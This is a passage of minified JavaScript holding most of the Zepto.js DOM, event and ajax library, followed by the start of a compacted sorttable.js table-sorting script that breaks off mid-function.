a,b,c,d,e=[],f=e.slice,g=e.filter,h=window.document,i={},j={},k={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},l=/^\s*<(\w+|!)[^>]*>/,m=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,n=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,o=/^(?:body|html)$/i,p=/([A-Z])/g,q=["val","css","html","text","data","width","height","offset"],r=["after","prepend","before","append"],s=h.createElement("table"),t=h.createElement("tr"),u={tr:h.createElement("tbody"),tbody:s,thead:s,tfoot:s,td:t,th:t,"*":h.createElement("div")},v=/complete|loaded|interactive/,w=/^\.([\w-]+)$/,x=/^#([\w-]*)$/,y=/^[\w-]*$/,z={},A=z.toString,B={},C,D,E=h.createElement("div"),F={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"};return B.matches=function(a,b){if(!b||!a||a.nodeType!==1)return!1;var c=a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.matchesSelector;if(c)return c.call(a,b);var d,e=a.parentNode,f=!e;return f&&(e=E).appendChild(a),d=~B.qsa(e,b).indexOf(a),f&&E.removeChild(a),d},C=function(a){return a.replace(/-+(.)?/g,function(a,b){return b?b.toUpperCase():""})},D=function(a){return g.call(a,function(b,c){return a.indexOf(b)==c})},B.fragment=function(b,d,e){var g,i,j;return m.test(b)&&(g=c(h.createElement(RegExp.$1))),g||(b.replace&&(b=b.replace(n,"<$1></$2>")),d===a&&(d=l.test(b)&&RegExp.$1),d in u||(d="*"),j=u[d],j.innerHTML=""+b,g=c.each(f.call(j.childNodes),function(){j.removeChild(this)})),L(e)&&(i=c(g),c.each(e,function(a,b){q.indexOf(a)>-1?i[a](b):i.attr(a,b)})),g},B.Z=function(a,b){return a=a||[],a.__proto__=c.fn,a.selector=b||"",a},B.isZ=function(a){return a instanceof B.Z},B.init=function(b,d){var e;if(!b)return B.Z();if(typeof b=="string"){b=b.trim();if(b[0]=="<"&&l.test(b))e=B.fragment(b,RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}else{if(H(b))return c(h).ready(b);if(B.isZ(b))return b;if(M(b))e=O(b);else if(K(b))e=[b],b=null;else if(l.test(b))e=B.fragment(b.trim(),RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}return B.Z(e,b)},c=function(a,b){return B.init(a,b)},c.extend=function(a){var b,c=f.call(arguments,1);return typeof a=="boolean"&&(b=a,a=c.shift()),c.forEach(function(c){V(a,c,b)}),a},B.qsa=function(a,b){var c,d=b[0]=="#",e=!d&&b[0]==".",g=d||e?b.slice(1):b,h=y.test(g);return J(a)&&h&&d?(c=a.getElementById(g))?[c]:[]:a.nodeType!==1&&a.nodeType!==9?[]:f.call(h&&!d?e?a.getElementsByClassName(g):a.getElementsByTagName(b):a.querySelectorAll(b))},c.contains=function(a,b){return a!==b&&a.contains(b)},c.type=G,c.isFunction=H,c.isWindow=I,c.isArray=M,c.isPlainObject=L,c.isEmptyObject=function(a){var b;for(b in a)return!1;return!0},c.inArray=function(a,b,c){return e.indexOf.call(b,a,c)},c.camelCase=C,c.trim=function(a){return a==null?"":String.prototype.trim.call(a)},c.uuid=0,c.support={},c.expr={},c.map=function(a,b){var c,d=[],e,f;if(N(a))for(e=0;e<a.length;e++)c=b(a[e],e),c!=null&&d.push(c);else for(f in a)c=b(a[f],f),c!=null&&d.push(c);return P(d)},c.each=function(a,b){var c,d;if(N(a)){for(c=0;c<a.length;c++)if(b.call(a[c],c,a[c])===!1)return a}else for(d in a)if(b.call(a[d],d,a[d])===!1)return a;return a},c.grep=function(a,b){return g.call(a,b)},window.JSON&&(c.parseJSON=JSON.parse),c.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){z["[object "+b+"]"]=b.toLowerCase()}),c.fn={forEach:e.forEach,reduce:e.reduce,push:e.push,sort:e.sort,indexOf:e.indexOf,concat:e.concat,map:function(a){return c(c.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return c(f.apply(this,arguments))},ready:function(a){return v.test(h.readyState)&&h.body?a(c):h.addEventListener("DOMContentLoaded",function(){a(c)},!1),this},get:function(b){return b===a?f.call(this):this[b>=0?b:b+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each(function(){this.parentNode!=null&&this.parentNode.removeChild(this)})},each:function(a){return e.every.call(this,function(b,c){return a.call(b,c,b)!==!1}),this},filter:function(a){return H(a)?this.not(this.not(a)):c(g.call(this,function(b){return B.matches(b,a)}))},add:function(a,b){return c(D(this.concat(c(a,b))))},is:function(a){return this.length>0&&B.matches(this[0],a)},not:function(b){var d=[];if(H(b)&&b.call!==a)this.each(function(a){b.call(this,a)||d.push(this)});else{var e=typeof b=="string"?this.filter(b):N(b)&&H(b.item)?f.call(b):c(b);this.forEach(function(a){e.indexOf(a)<0&&d.push(a)})}return c(d)},has:function(a){return this.filter(function(){return K(a)?c.contains(this,a):c(this).find(a).size()})},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){var a=this[0];return a&&!K(a)?a:c(a)},last:function(){var a=this[this.length-1];return a&&!K(a)?a:c(a)},find:function(a){var b,d=this;return typeof a=="object"?b=c(a).filter(function(){var a=this;return e.some.call(d,function(b){return c.contains(b,a)})}):this.length==1?b=c(B.qsa(this[0],a)):b=this.map(function(){return B.qsa(this,a)}),b},closest:function(a,b){var d=this[0],e=!1;typeof a=="object"&&(e=c(a));while(d&&!(e?e.indexOf(d)>=0:B.matches(d,a)))d=d!==b&&!J(d)&&d.parentNode;return c(d)},parents:function(a){var b=[],d=this;while(d.length>0)d=c.map(d,function(a){if((a=a.parentNode)&&!J(a)&&b.indexOf(a)<0)return b.push(a),a});return W(b,a)},parent:function(a){return W(D(this.pluck("parentNode")),a)},children:function(a){return W(this.map(function(){return U(this)}),a)},contents:function(){return this.map(function(){return f.call(this.childNodes)})},siblings:function(a){return W(this.map(function(a,b){return g.call(U(b.parentNode),function(a){return a!==b})}),a)},empty:function(){return this.each(function(){this.innerHTML=""})},pluck:function(a){return c.map(this,function(b){return b[a]})},show:function(){return this.each(function(){this.style.display=="none"&&(this.style.display=""),getComputedStyle(this,"").getPropertyValue("display")=="none"&&(this.style.display=T(this.nodeName))})},replaceWith:function(a){return this.before(a).remove()},wrap:function(a){var b=H(a);if(this[0]&&!b)var d=c(a).get(0),e=d.parentNode||this.length>1;return this.each(function(f){c(this).wrapAll(b?a.call(this,f):e?d.cloneNode(!0):d)})},wrapAll:function(a){if(this[0]){c(this[0]).before(a=c(a));var b;while((b=a.children()).length)a=b.first();c(a).append(this)}return this},wrapInner:function(a){var b=H(a);return this.each(function(d){var e=c(this),f=e.contents(),g=b?a.call(this,d):a;f.length?f.wrapAll(g):e.append(g)})},unwrap:function(){return this.parent().each(function(){c(this).replaceWith(c(this).children())}),this},clone:function(){return this.map(function(){return this.cloneNode(!0)})},hide:function(){return this.css("display","none")},toggle:function(b){return this.each(function(){var d=c(this);(b===a?d.css("display")=="none":b)?d.show():d.hide()})},prev:function(a){return c(this.pluck("previousElementSibling")).filter(a||"*")},next:function(a){return c(this.pluck("nextElementSibling")).filter(a||"*")},html:function(a){return arguments.length===0?this.length>0?this[0].innerHTML:null:this.each(function(b){var d=this.innerHTML;c(this).empty().append(X(this,a,b,d))})},text:function(b){return arguments.length===0?this.length>0?this[0].textContent:null:this.each(function(){this.textContent=b===a?"":""+b})},attr:function(c,d){var e;return typeof c=="string"&&d===a?this.length==0||this[0].nodeType!==1?a:c=="value"&&this[0].nodeName=="INPUT"?this.val():!(e=this[0].getAttribute(c))&&c in this[0]?this[0][c]:e:this.each(function(a){if(this.nodeType!==1)return;if(K(c))for(b in c)Y(this,b,c[b]);else Y(this,c,X(this,d,a,this.getAttribute(c)))})},removeAttr:function(a){return this.each(function(){this.nodeType===1&&Y(this,a)})},prop:function(b,c){return b=F[b]||b,c===a?this[0]&&this[0][b]:this.each(function(a){this[b]=X(this,c,a,this[b])})},data:function(b,c){var d=this.attr("data-"+b.replace(p,"-$1").toLowerCase(),c);return d!==null?$(d):a},val:function(a){return arguments.length===0?this[0]&&(this[0].multiple?c(this[0]).find("option").filter(function(){return this.selected}).pluck("value"):this[0].value):this.each(function(b){this.value=X(this,a,b,this.value)})},offset:function(a){if(a)return this.each(function(b){var d=c(this),e=X(this,a,b,d.offset()),f=d.offsetParent().offset(),g={top:e.top-f.top,left:e.left-f.left};d.css("position")=="static"&&(g.position="relative"),d.css(g)});if(this.length==0)return null;var b=this[0].getBoundingClientRect();return{left:b.left+window.pageXOffset,top:b.top+window.pageYOffset,width:Math.round(b.width),height:Math.round(b.height)}},css:function(a,d){if(arguments.length<2){var e=this[0],f=getComputedStyle(e,"");if(!e)return;if(typeof a=="string")return e.style[C(a)]||f.getPropertyValue(a);if(M(a)){var g={};return c.each(M(a)?a:[a],function(a,b){g[b]=e.style[C(b)]||f.getPropertyValue(b)}),g}}var h="";if(G(a)=="string")!d&&d!==0?this.each(function(){this.style.removeProperty(Q(a))}):h=Q(a)+":"+S(a,d);else for(b in a)!a[b]&&a[b]!==0?this.each(function(){this.style.removeProperty(Q(b))}):h+=Q(b)+":"+S(b,a[b])+";";return this.each(function(){this.style.cssText+=";"+h})},index:function(a){return a?this.indexOf(c(a)[0]):this.parent().children().indexOf(this[0])},hasClass:function(a){return a?e.some.call(this,function(a){return this.test(Z(a))},R(a)):!1},addClass:function(a){return a?this.each(function(b){d=[];var e=Z(this),f=X(this,a,b,e);f.split(/\s+/g).forEach(function(a){c(this).hasClass(a)||d.push(a)},this),d.length&&Z(this,e+(e?" ":"")+d.join(" "))}):this},removeClass:function(b){return this.each(function(c){if(b===a)return Z(this,"");d=Z(this),X(this,b,c,d).split(/\s+/g).forEach(function(a){d=d.replace(R(a)," ")}),Z(this,d.trim())})},toggleClass:function(b,d){return b?this.each(function(e){var f=c(this),g=X(this,b,e,Z(this));g.split(/\s+/g).forEach(function(b){(d===a?!f.hasClass(b):d)?f.addClass(b):f.removeClass(b)})}):this},scrollTop:function(b){if(!this.length)return;var c="scrollTop"in this[0];return b===a?c?this[0].scrollTop:this[0].pageYOffset:this.each(c?function(){this.scrollTop=b}:function(){this.scrollTo(this.scrollX,b)})},scrollLeft:function(b){if(!this.length)return;var c="scrollLeft"in this[0];return b===a?c?this[0].scrollLeft:this[0].pageXOffset:this.each(c?function(){this.scrollLeft=b}:function(){this.scrollTo(b,this.scrollY)})},position:function(){if(!this.length)return;var a=this[0],b=this.offsetParent(),d=this.offset(),e=o.test(b[0].nodeName)?{top:0,left:0}:b.offset();return d.top-=parseFloat(c(a).css("margin-top"))||0,d.left-=parseFloat(c(a).css("margin-left"))||0,e.top+=parseFloat(c(b[0]).css("border-top-width"))||0,e.left+=parseFloat(c(b[0]).css("border-left-width"))||0,{top:d.top-e.top,left:d.left-e.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||h.body;while(a&&!o.test(a.nodeName)&&c(a).css("position")=="static")a=a.offsetParent;return a})}},c.fn.detach=c.fn.remove,["width","height"].forEach(function(b){var d=b.replace(/./,function(a){return a[0].toUpperCase()});c.fn[b]=function(e){var f,g=this[0];return e===a?I(g)?g["inner"+d]:J(g)?g.documentElement["scroll"+d]:(f=this.offset())&&f[b]:this.each(function(a){g=c(this),g.css(b,X(this,e,a,g[b]()))})}}),r.forEach(function(a,b){var d=b%2;c.fn[a]=function(){var a,e=c.map(arguments,function(b){return a=G(b),a=="object"||a=="array"||b==null?b:B.fragment(b)}),f,g=this.length>1;return e.length<1?this:this.each(function(a,h){f=d?h:h.parentNode,h=b==0?h.nextSibling:b==1?h.firstChild:b==2?h:null,e.forEach(function(a){if(g)a=a.cloneNode(!0);else if(!f)return c(a).remove();_(f.insertBefore(a,h),function(a){a.nodeName!=null&&a.nodeName.toUpperCase()==="SCRIPT"&&(!a.type||a.type==="text/javascript")&&!a.src&&window.eval.call(window,a.innerHTML)})})})},c.fn[d?a+"To":"insert"+(b?"Before":"After")]=function(b){return c(b)[a](this),this}}),B.Z.prototype=c.fn,B.uniq=D,B.deserializeValue=$,c.zepto=B,c}();window.Zepto=Zepto,window.$===undefined&&(window.$=Zepto),function(a){function m(a){return a._zid||(a._zid=c++)}function n(a,b,c,d){b=o(b);if(b.ns)var e=p(b.ns);return(h[m(a)]||[]).filter(function(a){return a&&(!b.e||a.e==b.e)&&(!b.ns||e.test(a.ns))&&(!c||m(a.fn)===m(c))&&(!d||a.sel==d)})}function o(a){var b=(""+a).split(".");return{e:b[0],ns:b.slice(1).sort().join(" ")}}function p(a){return new RegExp("(?:^| )"+a.replace(" "," .* ?")+"(?: |$)")}function q(a,b){return a.del&&!j&&a.e in k||!!b}function r(a){return l[a]||j&&k[a]||a}function s(b,c,e,f,g,i,j){var k=m(b),n=h[k]||(h[k]=[]);c.split(/\s/).forEach(function(c){if(c=="ready")return a(document).ready(e);var h=o(c);h.fn=e,h.sel=g,h.e in l&&(e=function(b){var c=b.relatedTarget;if(!c||c!==this&&!a.contains(this,c))return h.fn.apply(this,arguments)}),h.del=i;var k=i||e;h.proxy=function(a){a=y(a);if(a.isImmediatePropagationStopped())return;a.data=f;var c=k.apply(b,a._args==d?[a]:[a].concat(a._args));return c===!1&&(a.preventDefault(),a.stopPropagation()),c},h.i=n.length,n.push(h),"addEventListener"in b&&b.addEventListener(r(h.e),h.proxy,q(h,j))})}function t(a,b,c,d,e){var f=m(a);(b||"").split(/\s/).forEach(function(b){n(a,b,c,d).forEach(function(b){delete h[f][b.i],"removeEventListener"in a&&a.removeEventListener(r(b.e),b.proxy,q(b,e))})})}function y(b,c){if(c||!b.isDefaultPrevented){c||(c=b),a.each(x,function(a,d){var e=c[a];b[a]=function(){return this[d]=u,e&&e.apply(c,arguments)},b[d]=v});if(c.defaultPrevented!==d?c.defaultPrevented:"returnValue"in c?c.returnValue===!1:c.getPreventDefault&&c.getPreventDefault())b.isDefaultPrevented=u}return b}function z(a){var b,c={originalEvent:a};for(b in a)!w.test(b)&&a[b]!==d&&(c[b]=a[b]);return y(c,a)}var b=a.zepto.qsa,c=1,d,e=Array.prototype.slice,f=a.isFunction,g=function(a){return typeof a=="string"},h={},i={},j="onfocusin"in window,k={focus:"focusin",blur:"focusout"},l={mouseenter:"mouseover",mouseleave:"mouseout"};i.click=i.mousedown=i.mouseup=i.mousemove="MouseEvents",a.event={add:s,remove:t},a.proxy=function(b,c){if(f(b)){var d=function(){return b.apply(c,arguments)};return d._zid=m(b),d}if(g(c))return a.proxy(b[c],b);throw new TypeError("expected function")},a.fn.bind=function(a,b,c){return this.on(a,b,c)},a.fn.unbind=function(a,b){return this.off(a,b)},a.fn.one=function(a,b,c,d){return this.on(a,b,c,d,1)};var u=function(){return!0},v=function(){return!1},w=/^([A-Z]|returnValue$|layer[XY]$)/,x={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};a.fn.delegate=function(a,b,c){return this.on(b,a,c)},a.fn.undelegate=function(a,b,c){return this.off(b,a,c)},a.fn.live=function(b,c){return a(document.body).delegate(this.selector,b,c),this},a.fn.die=function(b,c){return a(document.body).undelegate(this.selector,b,c),this},a.fn.on=function(b,c,h,i,j){var k,l,m=this;if(b&&!g(b))return a.each(b,function(a,b){m.on(a,c,h,b,j)}),m;!g(c)&&!f(i)&&i!==!1&&(i=h,h=c,c=d);if(f(h)||h===!1)i=h,h=d;return i===!1&&(i=v),m.each(function(d,f){j&&(k=function(a){return t(f,a.type,i),i.apply(this,arguments)}),c&&(l=function(b){var d,g=a(b.target).closest(c,f).get(0);if(g&&g!==f)return d=a.extend(z(b),{currentTarget:g,liveFired:f}),(k||i).apply(g,[d].concat(e.call(arguments,1)))}),s(f,b,i,h,c,l||k)})},a.fn.off=function(b,c,e){var h=this;return b&&!g(b)?(a.each(b,function(a,b){h.off(a,c,b)}),h):(!g(c)&&!f(e)&&e!==!1&&(e=c,c=d),e===!1&&(e=v),h.each(function(){t(this,b,e,c)}))},a.fn.trigger=function(b,c){return b=g(b)||a.isPlainObject(b)?a.Event(b):y(b),b._args=c,this.each(function(){"dispatchEvent"in this?this.dispatchEvent(b):a(this).triggerHandler(b,c)})},a.fn.triggerHandler=function(b,c){var d,e;return this.each(function(f,h){d=z(g(b)?a.Event(b):b),d._args=c,d.target=h,a.each(n(h,b.type||b),function(a,b){e=b.proxy(d);if(d.isImmediatePropagationStopped())return!1})}),e},"focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.trigger(b)}}),["focus","blur"].forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.each(function(){try{this[b]()}catch(a){}}),this}}),a.Event=function(a,b){g(a)||(b=a,a=b.type);var c=document.createEvent(i[a]||"Events"),d=!0;if(b)for(var e in b)e=="bubbles"?d=!!b[e]:c[e]=b[e];return c.initEvent(a,d,!0),y(c)}}(Zepto),function($){function triggerAndReturn(a,b,c){var d=$.Event(b);return $(a).trigger(d,c),!d.isDefaultPrevented()}function triggerGlobal(a,b,c,d){if(a.global)return triggerAndReturn(b||document,c,d)}function ajaxStart(a){a.global&&$.active++===0&&triggerGlobal(a,null,"ajaxStart")}function ajaxStop(a){a.global&&!--$.active&&triggerGlobal(a,null,"ajaxStop")}function ajaxBeforeSend(a,b){var c=b.context;if(b.beforeSend.call(c,a,b)===!1||triggerGlobal(b,c,"ajaxBeforeSend",[a,b])===!1)return!1;triggerGlobal(b,c,"ajaxSend",[a,b])}function ajaxSuccess(a,b,c,d){var e=c.context,f="success";c.success.call(e,a,f,b),d&&d.resolveWith(e,[a,f,b]),triggerGlobal(c,e,"ajaxSuccess",[b,c,a]),ajaxComplete(f,b,c)}function ajaxError(a,b,c,d,e){var f=d.context;d.error.call(f,c,b,a),e&&e.rejectWith(f,[c,b,a]),triggerGlobal(d,f,"ajaxError",[c,d,a||b]),ajaxComplete(b,c,d)}function ajaxComplete(a,b,c){var d=c.context;c.complete.call(d,b,a),triggerGlobal(c,d,"ajaxComplete",[b,c]),ajaxStop(c)}function empty(){}function mimeToDataType(a){return a&&(a=a.split(";",2)[0]),a&&(a==htmlType?"html":a==jsonType?"json":scriptTypeRE.test(a)?"script":xmlTypeRE.test(a)&&"xml")||"text"}function appendQuery(a,b){return b==""?a:(a+"&"+b).replace(/[&?]{1,2}/,"?")}function serializeData(a){a.processData&&a.data&&$.type(a.data)!="string"&&(a.data=$.param(a.data,a.traditional)),a.data&&(!a.type||a.type.toUpperCase()=="GET")&&(a.url=appendQuery(a.url,a.data),a.data=undefined)}function parseArguments(a,b,c,d){var e=!$.isFunction(b);return{url:a,data:e?b:undefined,success:e?$.isFunction(c)?c:undefined:b,dataType:e?d||c:c}}function serialize(a,b,c,d){var e,f=$.isArray(b),g=$.isPlainObject(b);$.each(b,function(b,h){e=$.type(h),d&&(b=c?d:d+"["+(g||e=="object"||e=="array"?b:"")+"]"),!d&&f?a.add(h.name,h.value):e=="array"||!c&&e=="object"?serialize(a,h,c,b):a.add(b,h)})}var jsonpID=0,document=window.document,key,name,rscript=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,scriptTypeRE=/^(?:text|application)\/javascript/i,xmlTypeRE=/^(?:text|application)\/xml/i,jsonType="application/json",htmlType="text/html",blankRE=/^\s*$/;$.active=0,$.ajaxJSONP=function(a,b){if("type"in a){var c=a.jsonpCallback,d=($.isFunction(c)?c():c)||"jsonp"+ ++jsonpID,e=document.createElement("script"),f=window[d],g,h=function(a){$(e).triggerHandler("error",a||"abort")},i={abort:h},j;return b&&b.promise(i),$(e).on("load error",function(c,h){clearTimeout(j),$(e).off().remove(),c.type=="error"||!g?ajaxError(null,h||"error",i,a,b):ajaxSuccess(g[0],i,a,b),window[d]=f,g&&$.isFunction(f)&&f(g[0]),f=g=undefined}),ajaxBeforeSend(i,a)===!1?(h("abort"),i):(window[d]=function(){g=arguments},e.src=a.url.replace(/=\?/,"="+d),document.head.appendChild(e),a.timeout>0&&(j=setTimeout(function(){h("timeout")},a.timeout)),i)}return $.ajax(a)},$.ajaxSettings={type:"GET",beforeSend:empty,success:empty,error:empty,complete:empty,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:jsonType,xml:"application/xml, text/xml",html:htmlType,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0},$.ajax=function(options){var settings=$.extend({},options||{}),deferred=$.Deferred&&$.Deferred();for(key in $.ajaxSettings)settings[key]===undefined&&(settings[key]=$.ajaxSettings[key]);ajaxStart(settings),settings.crossDomain||(settings.crossDomain=/^([\w-]+:)?\/\/([^\/]+)/.test(settings.url)&&RegExp.$2!=window.location.host),settings.url||(settings.url=window.location.toString()),serializeData(settings),settings.cache===!1&&(settings.url=appendQuery(settings.url,"_="+Date.now()));var dataType=settings.dataType,hasPlaceholder=/=\?/.test(settings.url);if(dataType=="jsonp"||hasPlaceholder)return hasPlaceholder||(settings.url=appendQuery(settings.url,settings.jsonp?settings.jsonp+"=?":settings.jsonp===!1?"":"callback=?")),$.ajaxJSONP(settings,deferred);var mime=settings.accepts[dataType],headers={},setHeader=function(a,b){headers[a.toLowerCase()]=[a,b]},protocol=/^([\w-]+:)\/\//.test(settings.url)?RegExp.$1:window.location.protocol,xhr=settings.xhr(),nativeSetHeader=xhr.setRequestHeader,abortTimeout;deferred&&deferred.promise(xhr),settings.crossDomain||setHeader("X-Requested-With","XMLHttpRequest"),setHeader("Accept",mime||"*/*");if(mime=settings.mimeType||mime)mime.indexOf(",")>-1&&(mime=mime.split(",",2)[0]),xhr.overrideMimeType&&xhr.overrideMimeType(mime);(settings.contentType||settings.contentType!==!1&&settings.data&&settings.type.toUpperCase()!="GET")&&setHeader("Content-Type",settings.contentType||"application/x-www-form-urlencoded");if(settings.headers)for(name in settings.headers)setHeader(name,settings.headers[name]);xhr.setRequestHeader=setHeader,xhr.onreadystatechange=function(){if(xhr.readyState==4){xhr.onreadystatechange=empty,clearTimeout(abortTimeout);var result,error=!1;if(xhr.status>=200&&xhr.status<300||xhr.status==304||xhr.status==0&&protocol=="file:"){dataType=dataType||mimeToDataType(settings.mimeType||xhr.getResponseHeader("content-type")),result=xhr.responseText;try{dataType=="script"?(1,eval)(result):dataType=="xml"?result=xhr.responseXML:dataType=="json"&&(result=blankRE.test(result)?null:$.parseJSON(result))}catch(e){error=e}error?ajaxError(error,"parsererror",xhr,settings,deferred):ajaxSuccess(result,xhr,settings,deferred)}else ajaxError(xhr.statusText||null,xhr.status?"error":"abort",xhr,settings,deferred)}};if(ajaxBeforeSend(xhr,settings)===!1)return xhr.abort(),ajaxError(null,"abort",xhr,settings,deferred),xhr;if(settings.xhrFields)for(name in settings.xhrFields)xhr[name]=settings.xhrFields[name];var async="async"in settings?settings.async:!0;xhr.open(settings.type,settings.url,async,settings.username,settings.password);for(name in headers)nativeSetHeader.apply(xhr,headers[name]);return settings.timeout>0&&(abortTimeout=setTimeout(function(){xhr.onreadystatechange=empty,xhr.abort(),ajaxError(null,"timeout",xhr,settings,deferred)},settings.timeout)),xhr.send(settings.data?settings.data:null),xhr},$.get=function(a,b,c,d){return $.ajax(parseArguments.apply(null,arguments))},$.post=function(a,b,c,d){var e=parseArguments.apply(null,arguments);return e.type="POST",$.ajax(e)},$.getJSON=function(a,b,c){var d=parseArguments.apply(null,arguments);return d.dataType="json",$.ajax(d)},$.fn.load=function(a,b,c){if(!this.length)return this;var d=this,e=a.split(/\s/),f,g=parseArguments(a,b,c),h=g.success;return e.length>1&&(g.url=e[0],f=e[1]),g.success=function(a){d.html(f?$("<div>").html(a.replace(rscript,"")).find(f):a),h&&h.apply(d,arguments)},$.ajax(g),this};var escape=encodeURIComponent;$.param=function(a,b){var c=[];return c.add=function(a,b){this.push(escape(a)+"="+escape(b))},serialize(c,a,b),c.join("&").replace(/%20/g,"+")}}(Zepto),function(a){a.fn.serializeArray=function(){var b=[],c;return a([].slice.call(this.get(0).elements)).each(function(){c=a(this);var d=c.attr("type");this.nodeName.toLowerCase()!="fieldset"&&!this.disabled&&d!="submit"&&d!="reset"&&d!="button"&&(d!="radio"&&d!="checkbox"||this.checked)&&b.push({name:c.attr("name"),value:c.val()})}),b},a.fn.serialize=function(){var a=[];return this.serializeArray().forEach(function(b){a.push(encodeURIComponent(b.name)+"="+encodeURIComponent(b.value))}),a.join("&")},a.fn.submit=function(b){if(b)this.bind("submit",b);else if(this.length){var c=a.Event("submit");this.eq(0).trigger(c),c.isDefaultPrevented()||this.get(0).submit()}return this}}(Zepto),function(a){"__proto__"in{}||a.extend(a.zepto,{Z:function(b,c){return b=b||[],a.extend(b,a.fn),b.selector=c||"",b.__Z=!0,b},isZ:function(b){return a.type(b)==="array"&&"__Z"in b}});try{getComputedStyle(undefined)}catch(b){var c=getComputedStyle;window.getComputedStyle=function(a){try{return c(a)}catch(b){return null}}}}(Zepto)
var h=!0,j=!1;sorttable={e:function(){arguments.callee.i||(arguments.callee.i=h,k&&clearInterval(k),document.createElement&&document.getElementsByTagName&&(sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,l(document.getElementsByTagName("table"),function(a){-1!=a.className.search(/\bsortable\b/)&&sorttable.k(a)})))},k:function(a){0==a.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);if(1==a.tHead.rows.length){sortbottomrows=[];for(var b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=document.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];var c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=document.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=document.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=document.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML="&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(var a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});var g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=sorttable.l;for(var c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var b="",c=0;c<a.childNodes.length;c++)b+=sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(var 